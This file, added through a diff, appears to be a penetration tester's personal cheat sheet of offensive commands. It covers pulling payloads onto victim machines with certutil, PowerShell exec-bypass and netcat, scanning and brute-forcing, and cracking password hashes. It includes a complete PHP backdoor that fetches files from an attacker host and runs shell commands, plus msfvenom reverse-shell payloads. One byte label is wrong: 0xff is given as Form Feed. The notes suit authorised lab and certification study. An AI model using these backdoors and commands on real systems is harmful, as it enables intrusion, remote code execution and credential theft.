@@ -1,0 +1,164 @@
+Brian's Quick Notes
+
+Commands and Tools
+
+Find files
+Linux:
+	# updatedb && locate filename
+Windows:
+	> dir filename /s /p
+
+SSH (port 22)
+# systemctl start ssh = start ssh in Kali
+Options:
+	-l = login name
+	-p = port
+	-J user@host:port
+
+HTTP
+# systemctl start apache2 = start apache in kali
+/var/www/html = location of apache files to serve
+
+# python -m SimpleHTTPServer = http from that location
+
+Download files to windows
+> certutil.exe -urlcache -split -f “URL” filename
+> bitsadmin /transfer download /priority normal http://IP_ADDR/file C:\output\path (Works on Windows 7/Windows Server 2000+)
+> nc IP_ADDR PORT > OUTFILE (run nc -lvp PORT < infile on attacking machine)
+> ftp -s:input.txt
+> tftp -i get file /path/on/victim
+> powershell.exe -exec bypass -Command “& {iex((New-Object System.Net.WebClient).DownloadFile(‘http://IP_ADDR:PORT/FILE','C:\Users\user\AppData\Local\ack.exe'));}”
+
+Download files to linux 
+# fetch http://IP_ADDR/file
+# wget http://IP_ADDR/file -O /path/to/where/you/want/file/to/go
+# curl http://IP_ADDR/file
+# nc IP_ADDR PORT > OUTFILE (run nc -lvp PORT < infile on attacking machine)
+# ftp -s:input.txt
+# tftp -i get file /path/on/victim
+
+Phase 1 – Intelligence Gathering
+
+# netdiscover -i eth0
+
+# tcpdump options pcap file location
+options: -w = write to file
+	  - r = read packets from file
+	  - n = don't convert addresses to names
+	  - X = print data of each packet
+	  - nn = capture data from a specific port
+
+# the harvester options
+options:
+	- d = domain name to search
+	- b = data source
+	- c = preform a DNS brute force
+eg: # the harvester -d domain name to search -b google
+
+# recon-ng [default]
+- Web reconnaissance framework
+
+Web Enum
+# nikto -h IP_ADDR
+# gobuster -e -u http://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -t 100 -s 200,204,301,302
+# dirsearch -u https://IP_ADDR -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -e php,txt,sh -x 404 -t 100
+# wfuzz -w wordlist.txt --filter "c=200 and l>0" http://IP_ADDR/somepath.php?url=FUZZ
+
+
+Content Management System Scanning
+
+# cmsmap http://IP_ADDR -f (D,J…)
+# droopescan scan drupal -u http://IP_ADDR
+# wpscan --url http://IP_ADDR --enumerate u,p,t 
+
+# nmap
+options:
+	-p- scans ports 1 – 65535
+	-sV Version Detection
+	-sS TCP SYN Scan
+	-T4 Aggressive Scan
+	-A Advanced Scan Options
+	-oN Normal file outpu
+	-sC Default set of scripts
+eg: # nmap -p- -sV -sS -T4 -A -oN file.txt ip address
+eg: # nmap -sC -sV IP_ADDR
+eg: # nmap -sC -sV -p- IP_ADDR
+eg: # nmap -sU -sV --top-ports 20 IP_ADDR
+eg: # nmap --script vuln IP_ADDR
+
+AutoRecon: https://github.com/Tib3rius/AutoRecon
+eg: # python3 autorecon.py -ct 4 -cs 10 -o ./ IP_1 IP_2 IP_3 IP_4
+
+nmapAutomator: https://github.com/21y4d/nmapAutomator
+
+GoBuster – Enumerate Website Folders
+# gobuster dir -u URL -w wordlist
+
+Full Interactive TTY Shell
+# In reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+$ Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
+
+PHP Backdoors
+
+<?php if (isset($_REQUEST[‘fupload’])) { file_put_contents($_REQUEST[‘fupload’], file_get_contents(‘http://IP_ADDR/' . $_REQUEST[‘fupload’])); }; if (isset($_REQUEST[‘fexec’])) { echo ‘<pre>’ . shell_exec($_REQUEST[‘fexec’]) . ‘</pre>’; }; ?>
+<filename>.php?fupload=nc.exe (for example) and 
+<filename>.php?fexec=nc IP PORT
+
+PenTest Monkey’s PHP Reverse Shell for Linux — http://pentestmonkey.net/tools/web-shells/php-reverse-shell
+and for Windows - https://raw.githubusercontent.com/Dhayalanb/windows-php-reverse-shell/master/Reverse%20Shell.php
+
+Also, on Kali: /usr/share/webshells/php/php-reverse-shell.php
+
+Password Brute Forcing
+# unshadow passwd shadow > creds.txt
+# john --wordlist=rockyou.txt creds.txt
+# fcrackzip -u -D -p ‘rockyou.txt’ zip_file
+# zip2john zip_file > hash.txt
+# john --format=zip hash.txt
+# hydra -l username -P password_list IP_ADDR -V http-post-form ‘/path/login.php:log=^USER^&pwd=^PASS^&wp-submit=Log In&testcookie=1:S=Location’ -t 25
+# hashcat -a 0 -m hash-mode hash.txt rockyou.txt
+
+BruteX — https://github.com/1N3/BruteX
+
+Useful Websites:
+https://crackstation.net/
+https://hashkiller.co.uk/
+For the hashcat command, the hash-mode list can be found here: https://hashcat.net/wiki/doku.php?id=example_hashes
+
+Other helpful shit
+http://0xc0ffee.io/blog/OSCP-Goldmine
+
+Post-Exploitation
+
+    LinEnum — https://github.com/rebootuser/LinEnum
+    linprivchecker —https://www.securitysift.com/download/linuxprivchecker.py
+    Powerless — https://github.com/M4ximuss/Powerless
+    PowerUp — https://github.com/HarmJ0y/PowerUp
+    Linux Exploit Suggester — https://github.com/mzet-/linux-exploit-suggester
+    Windows Exploit Suggester — https://github.com/bitsadmin/wesng
+    
+Creating web-shells
+
+# msfvenom -h
+# msfvenom -p windows/shell_reverse_tcp LHOST= yourip LPORT=listeningport -f c
+# msfvenom -p linux/x86/shell_bind_tcp LHOST= yourip LPORT=listeningport -f c
+# Common Bad Characters
+
+0x00    NULL (\0)
+0x09     Tab (\t)
+0x0a     Line Feed (\n)
+0x0d    Carriage Return (\r)
+0xff      Form Feed (\f)
+
+# msfvenom -p windows/shell_reverse_tcp LHOST=yourip LPORT=listeningport -f c  -e x86/shikata_ga_nai -b “\x00”
